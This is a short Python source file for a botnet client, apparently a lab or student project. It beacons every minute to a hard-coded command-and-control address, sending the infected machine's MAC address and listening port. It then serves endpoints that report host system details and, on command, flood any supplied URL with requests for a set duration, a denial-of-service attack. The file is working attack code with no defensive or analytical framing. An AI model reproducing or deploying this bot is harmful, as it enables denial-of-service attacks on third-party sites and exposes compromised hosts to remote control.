from flask import Flask, request
from werkzeug.serving import make_server
import platform
import psutil
import getmac
import json
import socket
import requests
import threading
import time

cnc_ip = '10.0.2.15'

def main():
    port = getFreePort()
    server = FlaskServer(port)
    server.run()
    body = {}
    body['mac-address'] = getMacAddress()
    body['running-port'] = port
    body['starting-up'] = True
    while True:
        try:
            requests.post(f"http://{cnc_ip}:5000/heartbeat", json=body, timeout=5)
            body['starting-up'] = False
        except Exception:
            pass
        time.sleep(60)

def getFreePort():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 0))
    port = sock.getsockname()[1]
    sock.close()
    return port

def getMacAddress():
    return getmac.get_mac_address()

class FlaskServer:
    app = Flask(__name__)
    port = None
    def __init__(self, port):
        self.port = port

    def run(self):
        server = make_server('0.0.0.0', self.port, self.app)
        threading.Thread(target = lambda: server.serve_forever()).start()

    @app.route('/systeminfo', methods = ['GET'])
    def getSystemInfo():
        info={}
        info['platform'] = platform.system()
        info['platform-release'] = platform.release()
        info['platform-version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['mac-address'] = getMacAddress()
        with open('/proc/cpuinfo', 'r') as f:
            for line in f:
                if line.startswith('model name'):
                    info['processor'] = line.split(':')[1].strip()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)

    @app.route('/ddos', methods = ['POST'])
    def sendRequest():
        json = request.get_json()

        url = json['url']
        timeSeconds = int(json['timeSeconds'])
        start_time = time.time()
        while time.time() - start_time < timeSeconds:
            try:
                requests.get(url, timeout=5)
            except Exception:
                pass

        return "", 200
        
if __name__ == "__main__":
    main()